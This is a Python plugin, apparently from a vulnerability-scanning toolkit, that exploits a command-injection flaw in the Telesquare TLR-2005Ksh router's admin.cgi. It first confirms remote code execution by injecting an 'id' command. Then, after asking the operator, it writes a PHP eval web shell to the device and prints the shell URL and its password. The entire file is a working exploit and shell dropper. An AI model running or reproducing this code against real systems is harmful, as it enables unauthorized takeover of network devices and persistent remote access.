#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
import urllib3
from rich.prompt import Prompt
urllib3.disable_warnings()
class Telesquare_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`id>csvuls.txt`'
        url3 = url + '/cgi-bin/csvuls.txt'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            req2 = requests.get(url3, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "uid=" in req2.text:
                if not self.batch:
                    OutPrintInfoSuc("Telesquare", f"存在Telesquare TLR-2005Ksh 路由器 admin.cgi RCE漏洞")
                    OutPrintInfo("Telesquare", url2)
                    OutPrintInfo("Telesquare", f"SHELL {url3}")
                else:
                    OutPrintInfoSuc("Telesquare", f"Telesquare存在RCE漏洞Shell:{url3}")
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Telesquare", "不存在Telesquare TLR-2005Ksh 路由器 admin.cgi RCE漏洞")
            return False
    def send_payload2(self,url):
        url2 = url + '/cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`echo "<?php @eval($_GET["cd"]);?>">slvuls.php`'
        url3 = url + '/cgi-bin/slvuls.php'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            req2 = requests.get(url3, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if req2.status_code == 200:
                OutPrintInfoSuc("Telesquare", f"执行成功")
                OutPrintInfoSuc("Telesquare", f"SHELL {url3}")
                OutPrintInfo("Telesquare", f"[b bright_red]PASS: cd")

        except Exception:
            OutPrintInfo("Telesquare", "执行出错")


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Telesquare", "开始检测Telesquare TLR-2005Ksh 路由器 admin.cgi RCE漏洞...")
        if self.send_payload(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否写入Shell([b red]y/n[/b red])")
                if choose == "y":
                    self.send_payload2(url)
        if not self.batch:
            OutPrintInfo("Telesquare", "Telesquare TLR-2005Ksh 路由器 admin.cgi RCE结束")
